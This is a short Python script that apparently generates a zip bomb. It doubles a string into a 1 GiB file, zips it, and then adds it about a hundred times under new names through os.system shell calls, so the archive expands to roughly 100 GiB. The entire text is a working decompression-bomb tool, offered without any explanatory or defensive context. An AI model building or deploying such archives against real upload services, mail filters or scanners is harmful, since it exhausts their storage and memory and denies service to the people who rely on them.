import os

def command(command):
    os.system(command)

# Creating the first file
payload = "a"
for i in range(30):
    payload += payload
with open("1", "w") as f:
    f.write(payload)

# Creating the zip file
command("zip -1 -9 -r zipbomb.zip 1")

# Adding duplicates of the file to the zip file
for i in range(2, 101):
    filename = i
    command(f"mv {filename-1} {filename}")
    command(f"zip -1 -9 zipbomb.zip {i}")

# Removing the leftover file
command(f"rm {filename}")
